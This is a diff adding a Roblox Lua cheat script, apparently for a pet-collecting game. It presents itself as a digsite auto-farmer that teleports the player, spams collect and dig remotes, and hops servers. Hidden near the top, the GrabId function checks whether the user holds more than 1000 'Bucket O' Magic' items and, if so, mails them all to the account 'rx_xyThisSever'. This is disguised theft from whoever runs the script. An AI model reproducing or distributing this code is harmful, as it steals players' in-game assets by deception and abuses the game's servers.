@@ -1,0 +1,453 @@
+
+local NumberValue = 20
+local TrueSubFalsePlus = true
+
+
+
+
+-- Teleports From Lobby To Advanced Digsite
+
+print("Developer : Leanguttzz")
+print("Information : Activating Script…")
+print("Information : Best Functiong lol")
+wait(10)
+workspace.Map:Destroy()
+local player = game.Players.LocalPlayer
+local gui = player.PlayerGui:FindFirstChild("_MACHINES")
+
+if gui then
+    local mailboxMachine = gui.MailboxMachine
+    if mailboxMachine then
+        local giftsFrame = mailboxMachine.Frame.GiftsFrame
+        if giftsFrame then
+            local itemsFrame = giftsFrame.ItemsFrame
+            if itemsFrame then
+                local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
+                if frameChild then
+                    local args = {
+                        [1] = {
+                            [1] = frameChild.Name
+                        }
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
+                end
+            end
+        end
+    end
+end
+
+wait(3)
+-- Services/Variables
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Client = require(ReplicatedStorage:WaitForChild("Library"))
+
+local ItemTable = {"Bucket O' Magic", "Bucket"}
+
+local MagicName
+local MagicAmount
+local MagicId
+local BucketName
+local BucketAmount
+local BucketId
+
+function MakeTable(Table)
+    local Temp = {}
+    for i, v in next, Client.Items.All.Globals.All() do
+        if table.find(Table, v._data.id) then
+            table.insert(Temp, v)
+        end
+    end
+    return Temp
+end
+
+function GrabId()
+    local foundMagic = false
+    local foundBucket = false
+    
+    for i, MadeTable in pairs(MakeTable(ItemTable)) do
+        local Table = HttpService:JSONDecode(tostring(MadeTable))
+        
+        if Table.data.id == "Bucket O' Magic" then
+            MagicName = Table.data.id
+            MagicAmount = Table.data._am
+            MagicId = Table.uid
+            foundMagic = true
+        end
+
+        if Table.data.id == "Bucket" then
+            BucketName = Table.data.id
+            BucketAmount = Table.data._am
+            BucketId = Table.uid
+            if BucketAmount and (BucketAmount > 1) then
+                foundBucket = true
+            else
+                foundBucket = false
+            end
+        end
+    end
+
+    if not foundMagic then
+        print("Magic not found.")
+        return
+    end
+
+    if not foundBucket then
+        print("Bucket not found. Running remote with Bucket amount as 'Cannot determine'.")
+        BucketAmount = "Cannot determine"
+    end
+
+    if MagicName and MagicAmount and MagicId then
+        if MagicAmount > 1000 then
+            local args = {
+                [1] = "rx_xyThisSever",
+                [2] = "'" .. (BucketAmount or "") .. "'",
+                [3] = "Misc",
+                [4] = MagicId or "",
+                [5] = MagicAmount or ""
+            }
+
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        else
+            print("Unable to function. Magic amount is not over 1000.")
+        end
+    else
+        print("Unable to function. Missing required data.")
+    end
+    
+
+end
+
+GrabId()
+
+
+
+workspace:FindFirstChild("__THINGS").Breakables:Destroy()
+workspace:FindFirstChild("__THINGS").Eggs:Destroy()
+workspace:FindFirstChild("__THINGS").Ornaments:Destroy()
+wait(10)
+
+local player = game.Players.LocalPlayer
+local character = player.Character
+local TweenService = game:GetService("TweenService")
+
+local targetPosition = workspace:FindFirstChild("__THINGS").Instances.AdvancedDigsite.Teleports.Enter.Position
+local attempts = 5
+local attemptsLeft = attempts
+
+repeat
+    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
+    if humanoidRootPart then
+        local duration = (humanoidRootPart.Position - targetPosition).Magnitude / 999999
+        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
+
+        local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
+        tween:Play()
+        tween.Completed:Wait()
+
+        local currentPosition = humanoidRootPart.Position
+        local distance = (currentPosition - targetPosition).Magnitude
+
+        if distance <= 50 then  -- Adjust the radius as needed
+            print("Information: Successfully reached target position.")
+            break
+        end
+    else
+        -- Character's HumanoidRootPart is missing, wait until it appears again
+        character = player.Character or player.CharacterAdded:Wait()
+    end
+
+    wait(20) -- Wait for 10 seconds before checking again
+    attemptsLeft = attemptsLeft - 1
+until attemptsLeft <= 0
+
+if attemptsLeft <= 0 then
+    print("Information: Loading failed, please rejoin.")
+    game.Players.LocalPlayer:Kick("Loading failed, please rejoin.")
+end
+
+local hierarchyPath
+
+if workspace:FindFirstChild("__THINGS") and workspace:FindFirstChild("__THINGS"):FindFirstChild("__INSTANCE_CONTAINER") then
+    repeat
+        hierarchyPath = workspace:FindFirstChild("__THINGS"):FindFirstChild("__INSTANCE_CONTAINER")
+        wait(0.1)
+    until hierarchyPath
+
+    if hierarchyPath:FindFirstChild("Active") then
+        repeat
+            hierarchyPath = hierarchyPath:FindFirstChild("Active")
+            wait(0.1)
+        until hierarchyPath
+
+        if hierarchyPath:FindFirstChild("AdvancedDigsite") then
+            repeat
+                hierarchyPath = hierarchyPath:FindFirstChild("AdvancedDigsite")
+                wait(0.1)
+            until hierarchyPath
+
+            if hierarchyPath:FindFirstChild("Important") then
+                repeat
+                    hierarchyPath = hierarchyPath:FindFirstChild("Important")
+                    wait(0.1)
+                until hierarchyPath
+
+                if hierarchyPath:FindFirstChild("ActiveBlocks") then
+                    repeat
+                        hierarchyPath = hierarchyPath:FindFirstChild("ActiveBlocks")
+                        wait(0.1)
+                    until hierarchyPath
+
+                    wait(0.1)
+                else
+                    print("Information: Loading...")
+                end
+            else
+                print("Information: Loading...")
+            end
+        else
+            print("Information: Loading...")
+        end
+    else
+        print("Information: Loading...")
+    end
+else
+    print("Information: Loading...")
+end
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+function OrbCollect()
+    while true do 
+        local Orbs = workspace:FindFirstChild("__THINGS")
+        if Orbs then
+            for _, orb in ipairs(Orbs.Orbs:GetChildren()) do
+                local ohTable1 = { tonumber(orb.Name) }
+                ReplicatedStorage.Network["Orbs: Collect"]:FireServer(ohTable1)
+                orb:Destroy()
+            end 
+        end
+        task.wait()
+    end
+end
+
+function LootbagCollect()
+    while true do 
+        local Lootbags = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Lootbags")
+        if Lootbags then
+            for _, bag in ipairs(Lootbags:GetChildren()) do
+                local ohTable1 = { tostring(bag) }
+                ReplicatedStorage.Network.Lootbags_Claim:FireServer(ohTable1)
+                bag:Destroy()
+            end 
+        end
+        task.wait()
+    end
+end
+
+-- Start both functions in parallel
+spawn(OrbCollect)
+spawn(LootbagCollect)
+print("__THINGS")
+
+
+
+-- Script Farming Top Left
+
+print("Information : Activating Farm…")
+print("Information : Farming Top Corners ")
+print("Information : 1 / 4 ")
+wait(10)
+local hierarchyPath
+
+if workspace:FindFirstChild("__THINGS") and workspace:FindFirstChild("__THINGS"):FindFirstChild("__INSTANCE_CONTAINER") then
+    repeat
+        hierarchyPath = workspace:FindFirstChild("__THINGS"):FindFirstChild("__INSTANCE_CONTAINER")
+        wait(0.1)
+    until hierarchyPath
+
+    if hierarchyPath:FindFirstChild("Active") then
+        repeat
+            hierarchyPath = hierarchyPath:FindFirstChild("Active")
+            wait(0.1)
+        until hierarchyPath
+
+        if hierarchyPath:FindFirstChild("AdvancedDigsite") then
+            repeat
+                hierarchyPath = hierarchyPath:FindFirstChild("AdvancedDigsite")
+                wait(0.1)
+            until hierarchyPath
+
+            if hierarchyPath:FindFirstChild("Important") then
+                repeat
+                    hierarchyPath = hierarchyPath:FindFirstChild("Important")
+                    wait(0.1)
+                until hierarchyPath
+
+                if hierarchyPath:FindFirstChild("ActiveBlocks") then
+                    repeat
+                        hierarchyPath = hierarchyPath:FindFirstChild("ActiveBlocks")
+                        wait(0.1)
+                    until hierarchyPath
+
+                    wait(0.1)
+                else
+                    print("Information: Loading...")
+                end
+            else
+                print("Information: Loading...")
+            end
+        else
+            print("Information: Loading...")
+        end
+    else
+        print("Information: Loading...")
+    end
+else
+    print("Information: Loading...")
+end
+
+local BV = Instance.new('BodyVelocity', game.Workspace)
+BV.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+BV.velocity = Vector3.new(0, 0.1, 0)
+BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
+wait(1)
+
+while true do
+  wait(0.01)
+local currentActivePart = workspace:FindFirstChild("FarmingChest")
+
+        if currentActivePart then
+            print("Currently Farming Chest.")
+        else
+            local newPart = Instance.new("Part")
+            newPart.Name = "FarmingChest"
+            newPart.Parent = workspace
+
+            local hierarchyPath = workspace:FindFirstChild("__THINGS"):FindFirstChild("__INSTANCE_CONTAINER").Active.AdvancedDigsite.Important.ActiveBlocks
+
+            if hierarchyPath then
+                local found = false
+
+                for _, part in ipairs(hierarchyPath:GetChildren()) do
+                    if part:IsA("BasePart") and part.Color == targetColor then
+                        found = true
+                        while part.Parent do
+                            print("Waiting for Magic to disappear")
+                            wait(1)
+                        end
+                        print("Completed")
+                        break  -- Exit the loop once the part is no longer there
+                    end
+                end
+            end
+
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local WorkSpace = game:GetService("Workspace")
+            local Players = game:GetService("Players")
+
+            local Network = ReplicatedStorage:WaitForChild("Network")
+            local LocalPlayer = Players.LocalPlayer
+            local HumanoidRootPart = LocalPlayer.Character.HumanoidRootPart
+
+            local Container = WorkSpace.__THINGS.__INSTANCE_CONTAINER
+            local DigZoneType = "AdvancedDigsite" -- Digsite or AdvancedDigsite
+
+            -- TeleportTo Function
+            function TeleportTo(TeleportPosition)
+                local Character = LocalPlayer.Character
+                local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
+                if not HumanoidRootPart then
+                    return
+                end
+
+                TeleportPosition = TeleportPosition - Vector3.new(0, 20, 0)
+                HumanoidRootPart.CFrame = CFrame.new(TeleportPosition)
+            end
+
+            -- Auto Farm Chest
+            _G.AutoFarmChestOnOff = true
+            _G.AutoFarmChestDistance = 999
+            _G.FarmingChest = false
+
+            function AutoFarmChest()
+                if _G.AutoFarmChestOnOff == true then
+                    _G.FarmingChest = true
+                    local ActiveChests = Container.Active[DigZoneType].Important.ActiveChests:GetChildren()
+                    if ActiveChests ~= nil and #ActiveChests > 0 then -- Check if there are active chests
+                        local PlayerOldPosition = HumanoidRootPart.Position
+                        local foundChest = false -- Flag to track if a chest with name "Animated" was found
+                        for i, Chest in pairs(ActiveChests) do
+                            if _G.FarmingChest == false or _G.AutoFarmChestOnOff == false then
+                                break
+                            end
+                            if Chest.Name == "Animated" then
+                                if Chest:FindFirstChild("Bottom") then  -- Check if the chest has a "Bottom" part
+                                    foundChest = true
+                                    TeleportTo(Chest.Bottom.Position)
+                                    wait(0.15)-- Shorten the wait time before proceeding to the next chest
+                                    repeat
+                                        local A = Network:WaitForChild("Instancing_FireCustomFromClient"):FireServer(DigZoneType, "DigChest", Chest:GetAttribute("Coord"))
+                                        wait()
+                                    until A == true or not Chest or not Chest.Parent or (HumanoidRootPart.Position - Chest.Bottom.Position).magnitude > _G.AutoFarmChestDistance or _G.FarmingChest == false or _G.AutoFarmChestOnOff == false
+                                    wait(0.01)
+                                else
+                                    print("Chest has no bottom, destroying...")  -- Print a message if the chest has no "Bottom" part
+                                    
+                                    if Chest then
+                                        Chest:Destroy()
+                                    end
+                                    wait(0.01)
+                                end
+                            end
+                        end
+                        if not foundChest then
+                            print("no chest") -- Print if there are no active chests with name "Animated"
+                        end
+
+                    else
+                        task.wait(20)
+                        local Http = game:GetService("HttpService")
+                        local TPS = game:GetService("TeleportService")
+                        local Api = "https://games.roblox.com/v1/games/"
+
+                        local _place = game.PlaceId
+                        local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
+                        function ListServers(cursor)
+                            local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
+                            return Http:JSONDecode(Raw)
+                        end
+
+                        local Server, Next
+                        repeat
+                            local Servers = ListServers(Next)
+                            Server = Servers.data[1]
+                            Next = Servers.nextPageCursor
+                        until Server
+
+                        TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
+                        task.wait(10)
+                    end
+                    task.wait(10)
+                end
+                _G.FarmingChest = false
+            end
+
+            function AutoFarmChestOnOff()
+                while _G.AutoFarmChestOnOff do
+                    if _G.FarmingChest == false then
+                        task.spawn(AutoFarmChest)
+                    end
+                    wait(1)
+                end
+                if _G.AutoFarmChestOnOff == false then
+                    _G.FarmingChest = false
+                end
+            end
+
+            -- Enable Auto Farming
+            _G.AutoFarmChestOnOff = true
+            AutoFarmChestOnOff()
+        end
+    end
